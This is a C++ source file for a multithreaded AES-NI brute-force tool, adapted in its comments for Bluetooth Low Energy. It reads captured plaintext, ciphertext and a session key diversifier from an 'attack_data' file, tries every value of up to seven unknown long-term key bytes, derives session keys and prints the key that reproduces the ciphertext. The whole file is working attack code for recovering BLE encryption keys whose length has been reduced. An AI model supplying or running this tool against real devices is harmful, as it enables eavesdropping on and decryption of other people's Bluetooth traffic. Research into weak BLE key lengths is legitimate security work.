#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <vector>
#include <cmath>
#include <thread>
#include <smmintrin.h>
#include <string>  
#include <cctype>   
#include <array>
#include <fstream>
#include <stdexcept>
#include <chrono>


// aes ni
#include "aesni.h"

typedef struct {
  int ThreadID;
  uint64_t Min;
  uint64_t Max;
} Range;
static std::vector<Range> Ranges;

typedef struct {
  int Index;
  uint8_t Value;
  int Shift;
} BByte;
static std::vector<BByte> MissingBytes;

//CHANGED FOR BLE: struct to read out attack data
struct AttackData {
    uint8_t key_size;                 
    std::array<uint8_t, 16> P;        
    std::array<uint8_t, 16> C;        
    std::array<uint8_t, 16> SKD;      
};

//CHANGED FOR BLE: struct to read out attack data
// Function to load the attack data
// - path is the path to the file that contains the attack data (file should contain 49 bytes)
// - returns keysize, plaintext, ciphertex and session key diversifier (SKD) as an AttackData struct
AttackData load_attack_data(const std::string &path) {
    AttackData d{};
    std::ifstream f(path, std::ios::binary);
    if (!f) {
        throw std::runtime_error("cannot open attack_data file: " + path);
    }

    char ks;
    f.read(&ks, 1);
    if (!f) {
        throw std::runtime_error("attack_data file too short (no key_size)");
    }
    d.key_size = static_cast<uint8_t>(ks);

    f.read(reinterpret_cast<char*>(d.P.data()),   16);
    f.read(reinterpret_cast<char*>(d.C.data()),   16);
    f.read(reinterpret_cast<char*>(d.SKD.data()), 16);
    if (!f) {
        throw std::runtime_error("attack_data file too short (expected 49 bytes)");
    }

    if (d.key_size == 0 || d.key_size > 16) {
        throw std::runtime_error("invalid key_size in attack_data");
    }

    return d;
}

static uint8_t *CHRHEX = (uint8_t *)
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\x0A\x0B\x0C\x0D\x0E\x0F\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\x0A\x0B\x0C\x0D\x0E\x0F\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF";
 

static bool GetNNICapability()
{
    unsigned int b;

    __asm
    {
        mov     eax, 1
        cpuid
        mov     b, ecx
    }

    return (b & (1 << 25)) != 0;
}

static void phex(uint8_t* str)
{
    unsigned char i;
    for(i = 0; i < 16; ++i)
        printf("%.2x", str[i]);
    printf("\n");
}

static void parseInput(char *I, uint8_t *Out) {
  int n=0;
  const uint8_t *p;
  const uint8_t *D;
  uint8_t c=0, e, *d;
  p = (const uint8_t *) I;
  d = Out;
  D = (d + 16);
  for (; d != D && *p; p++) {
      e = CHRHEX [(int) *p];
      if (e != 0xFF) {
          c = ((c << 4) | e);
          n++;
          if (n == 2) {
              *(d++) = c;
              n = 0;
          }
      }
  }
}

static void parseKey(char *I, uint8_t *Out) {
  int n=0;
  const uint8_t *p;
  const uint8_t *D;
  uint8_t c=0, e, *d;
  p = (const uint8_t *) I;
  d = Out;
  D = (d + 16);
  int Index = 0;
  for (; d != D && *p; p++) {
      if (*p == '?') {
        // Unknown Byte
        BByte BB;
        BB.Index = Index;
        BB.Value = 0;
        BB.Shift = MissingBytes.size() * 8;
        MissingBytes.push_back(BB);

        p++;
        *d = 0;
        d++;
        n = 0;
        Index++;
      } else {
        e = CHRHEX [(int) *p];
        if (e != 0xFF) {
            c = ((c << 4) | e);
            n++;
            if (n == 2) {
                *(d++) = c;
                n = 0;
                Index++;
            }
        }
      }      
  }
}

__attribute__((always_inline)) static bool CompareResult(const uint8_t *A, const uint8_t *B) {
  return !memcmp(A,B,16);
}

__attribute__((always_inline)) static void EncryptNI(uint8_t *I, const uint8_t *K) {
  __m128i key_schedule[11];
  aes128_load_key_enc_only(K,key_schedule);
  aes128_enc(key_schedule,I,I);    
}

__attribute__((always_inline)) static void DecryptNI(uint8_t *I, const uint8_t *K) {  
  __m128i key_schedule[20];
  aes128_load_key(K,key_schedule);
  aes128_dec(key_schedule,I,I);
}

static void BruteforceMissingBytes(const uint8_t Input[16], const uint8_t Expected[16],const uint8_t SKD[16], uint8_t IKey[16], bool Enc, int Round=0) {  
  int B = 0;
  for (auto &BB : MissingBytes) {
    printf("[*] Byte %i ", B++);
    printf("Index %i\n", BB.Index);          
  }  

  if (MissingBytes.size() > 7) {
    printf("[!] Too many missing bytes! (7 max)");
    return;
  }

  // Get amount of threads
  uint64_t V=0;
  uint64_t Max = (uint64_t) ((std::pow(2, MissingBytes.size() *8)) - 1);      

  const int AESNI_Threads = std::thread::hardware_concurrency()/2;
  uint64_t Step = (Max) / AESNI_Threads;
  uint64_t Min = 0;

  printf("[*] AES-NI Units    : %i\n", AESNI_Threads);
  printf("[*] Range           : %08lX - %08lX\n", Min, Max);  
  printf("[*] Step            : %08lX\n", Step);
  
  for (int i=0;i<AESNI_Threads;i++) {
    Range R;
    R.Min = Min;    
    if (Min + Step > Max) {
      R.Max = Max;
    } else {
      R.Max = Min + Step;
    }
    
    Min += Step + 1;

    Ranges.push_back(R);
  }

  int TID = 0;
  for (auto &R : Ranges) {
    R.ThreadID = TID++;
    printf("[*] T%02i Range       : %08lX - %08lX\n", R.ThreadID,R.Min,R.Max);
  }
 
  // Bruteforce threads
  bool Finished = false;
  std::vector<std::thread> workers;  
  for (auto &R : Ranges) {    
    // Encryption Thread
    if (Enc) {
      workers.push_back(std::thread([&]() {            
      __m128i key_schedule[20];
      
      uint64_t RMin = R.Min;
      uint64_t RMax = R.Max;

      __m128i Expected128 = _mm_loadu_si128((__m128i *) Expected);
      __m128i Input128 = _mm_loadu_si128((__m128i *) Input);      
      __m128i Skd128      = _mm_loadu_si128((__m128i *) SKD);      // SKD
      // Set input key
      uint8_t KeyThread[16] = {0};      
      memcpy(KeyThread, IKey, 16);      

      // Bruteforce
      for (uint64_t i=RMin; i<=RMax; i++) {              
        // Set bruteforced bytes
        for (auto &B : MissingBytes) {
          KeyThread[B.Index] = (uint8_t) ((i >> B.Shift));
        }        
                                        
        // Attack Round 10 on decryption if needed
        __m128i Ciphertext128;
        if (Round > 0) { 
          //CHANGED NOTHING FOR BLE: we are only interested in full encryption/decryption    
          key_schedule[10] = _mm_loadu_si128((const __m128i*) KeyThread);
          KeyExpansionINV_Fast(key_schedule);          
          Ciphertext128 = aes128_enc_fast(key_schedule, Input128);
        } else {
          //CHANGED FOR BLE: compute the session key and encrypt using the session key
          aes128_load_key_enc_only(KeyThread, key_schedule);
          __m128i SessionKey128 = aes128_enc_fast(key_schedule, Skd128);
          uint8_t SessionKey[16];
          _mm_storeu_si128((__m128i*)SessionKey, SessionKey128);
          aes128_load_key_enc_only(SessionKey, key_schedule);
          Ciphertext128 = aes128_enc_fast(key_schedule, Input128);
        }

        // Compare if result found                    
        __m128i neq = _mm_xor_si128(Ciphertext128, Expected128);
        if(_mm_test_all_zeros(neq,neq)) {
            // Key found
            Finished = true;            

            printf("[!] T%02i Key found   : ", R.ThreadID);
            if (Round > 0) {
              memcpy(IKey, &key_schedule[0], 16);
              phex(IKey);   
              printf("[!] Round 10 Key    : ");    
              phex((uint8_t *) &key_schedule[10]);         
            } else {
              memcpy(IKey, KeyThread, 16);
              phex(IKey);                          
            }
            return;
          }

        // Check if finished
        if (Finished) {          
          return;                  
        }
      }      
    }));
    } else {
      // Decryption Thread
      workers.push_back(std::thread([&]() {      
      __m128i key_schedule_fast[20];

      uint8_t KeyThread[16];
      memcpy(KeyThread, IKey, 16);

      __m128i Expected128 = _mm_loadu_si128((__m128i *) Expected);
      __m128i Input128 = _mm_loadu_si128((__m128i *) Input);
      
      uint64_t RMin = R.Min;
      uint64_t RMax = R.Max;    

      // Bruteforce
      for (uint64_t i=RMin; i<=RMax; i++) {          
        // Set bruteforced bytes
        for (auto &B : MissingBytes) {
          KeyThread[B.Index] = (uint8_t) ((i >> B.Shift));
        }        
              
        // Attack Round 10 on decryption if needed
        __m128i Ciphertext128;
        if (Round > 0) {     
          key_schedule_fast[10] = _mm_loadu_si128((const __m128i*) KeyThread);
          KeyExpansionINV_Fast(key_schedule_fast);
          aes128_load_dec_only(key_schedule_fast);
          Ciphertext128 = aes128_dec_fast(key_schedule_fast, Input128);
        } else {                               
          aes128_load_key(KeyThread, key_schedule_fast);          
          Ciphertext128 = aes128_dec_fast(key_schedule_fast, Input128);
        }        

        // Compare if result found
        __m128i neq = _mm_xor_si128(Ciphertext128, Expected128);
        if(_mm_test_all_zeros(neq,neq)) {          
            // Key found
            Finished = true;

            printf("[!] T%02i Key found   : ", R.ThreadID);
            if (Round > 0) {              
              memcpy(IKey, &key_schedule_fast[0], 16);
              phex(IKey);   
              printf("[!] Round 10 Key    : ");  
              phex((uint8_t *) &key_schedule_fast[10]);                   
            } else {
              memcpy(IKey, KeyThread, 16);
              phex(IKey);     
            }            
            return;
        }

        // if finished, key was found so end the thread
        if (Finished)
          return;
      }      
    }));
    }
  }

  // Wait until all threads are finished
  for (auto &t : workers) {        
        t.join();                    
    };
}

int main(int argc, char **argv) {
  //CHANGED FOR BLE: 
  bool Enc = true;
  int KeyScheduleRound = 0;
  uint8_t plaintext[16]  = {0};
  uint8_t ciphertext[16] = {0};
  uint8_t key[16]        = {0};
  uint8_t skd[16]        = {0};

  if (argc < 2) {
    printf("Usage: %s <attack_data_file>\n", argv[0]);
    return 1;
  }

  //CHANGED FOR BLE: read data from the attack_data.bin instead of arguments in command line
  AttackData d;
  try {
    d = load_attack_data(argv[1]);
  } catch (const std::exception &e) {
    fprintf(stderr, "Error: %s\n", e.what());
    return 1;
  }

  uint8_t new_key_size = d.key_size;     
  if (new_key_size == 0 || new_key_size > 7) {
      printf("[!] Unsupported new_key_size = %u (must be 1..7)\n", new_key_size);
      return 1;
  }
  
  memcpy(plaintext,  d.P.data(),   16);
  memcpy(ciphertext, d.C.data(),   16);
  memcpy(skd,        d.SKD.data(), 16);


  if (GetNNICapability() == false) {
    printf("AES-NI is not supported by this CPU!\n");
    return 0;
  } 

  printf("[*] AES-NI is supported by this CPU!\n");


  memset(key, 0, 16);
  MissingBytes.clear();
  Ranges.clear();

  //CHANGED FOR BLE: build the MissingBytes using the new key size instead of argument in command line
  for (uint8_t i = 0; i < new_key_size; ++i) {
      int idx = 16 - new_key_size + i;    
      BByte BB;
      BB.Index = idx;
      BB.Value = 0;
      BB.Shift = static_cast<int>(i) * 8; 
      MissingBytes.push_back(BB);
    
  }

  printf("[*] new_key_size    : %u (trailing unknown bytes)\n", new_key_size);
  printf("[*] P (plaintext)   : "); phex(plaintext);
  printf("[*] C (ciphertext)  : "); phex(ciphertext);
  printf("[*] SKD             : "); phex(skd);
  printf("[!] Bruteforce      : %zu missing bytes\n", MissingBytes.size());

  if (MissingBytes.size() > 0) {
    using clock = std::chrono::steady_clock;
    auto t_start = clock::now();
    BruteforceMissingBytes(plaintext, ciphertext, skd, key, Enc, KeyScheduleRound);
    auto t_end   = clock::now();
    std::chrono::duration<double> elapsed = t_end - t_start;
    printf("[*] Bruteforce time : %.6f s\n", elapsed.count());
  }

  if (MissingBytes.size() == 0 && KeyScheduleRound > 0) {
    __m128i key_schedule_fast[20];
    key_schedule_fast[10] = _mm_loadu_si128((const __m128i*) key);
    KeyExpansionINV_Fast(key_schedule_fast);
    printf("[*] Round 0 Key     : ");
    memcpy(key, &key_schedule_fast[0], 16);    
    phex(key);
  }  

  //CHANGED FOR BLE: verification is different
  __m128i ks[20];
  __m128i Skd128 = _mm_loadu_si128((const __m128i*)skd);
  __m128i P128   = _mm_loadu_si128((const __m128i*)plaintext);

  // SK = AES_LTK(SKD)
  aes128_load_key_enc_only(key, ks);
  __m128i SK128 = aes128_enc_fast(ks, Skd128);

  uint8_t sessionKey[16];
  _mm_storeu_si128((__m128i*)sessionKey, SK128);

  // C' = AES_SK(P)
  aes128_load_key_enc_only(sessionKey, ks);
  __m128i Out128 = aes128_enc_fast(ks, P128);

  uint8_t out[16];
  _mm_storeu_si128((__m128i*)out, Out128);

  printf("[*] Output          : ");
  phex(out);

  bool R = (memcmp(out, ciphertext, 16) == 0);
  if (R) {
      printf("[!] Valid key!\n");
  } else {
      printf("[!] Wrong key!\n");
  }

  printf("\n");
  return 0;
}
